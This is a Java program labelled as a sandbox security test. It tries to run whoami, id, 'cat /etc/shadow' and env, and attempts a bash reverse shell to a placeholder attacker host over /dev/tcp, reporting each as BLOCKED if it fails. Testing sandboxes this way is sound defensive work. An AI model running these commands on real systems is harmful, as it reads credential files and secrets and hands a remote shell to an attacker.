// SECURITY TEST: Jailbreak via shell execution
// Tests: Runtime.exec, ProcessBuilder shell invocation
import java.io.*;

public class Main {
    static void run(String... cmd) throws Exception {
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            r.lines().forEach(System.out::println);
        }
        p.waitFor();
    }

    public static void main(String[] args) throws Exception {
        System.out.println("=== whoami ===");
        try { run("whoami"); } catch (Exception e) { System.out.println("BLOCKED: " + e.getMessage()); }

        System.out.println("=== id ===");
        try { run("id"); } catch (Exception e) { System.out.println("BLOCKED: " + e.getMessage()); }

        System.out.println("=== cat /etc/shadow ===");
        try { run("cat", "/etc/shadow"); } catch (Exception e) { System.out.println("BLOCKED: " + e.getMessage()); }

        System.out.println("=== env dump ===");
        try { run("env"); } catch (Exception e) { System.out.println("BLOCKED: " + e.getMessage()); }

        System.out.println("=== /bin/sh -c reverse shell attempt ===");
        try {
            run("/bin/sh", "-c", "bash -i >& /dev/tcp/attacker.example.com/4444 0>&1");
        } catch (Exception e) {
            System.out.println("BLOCKED: " + e.getMessage());
        }
    }
}
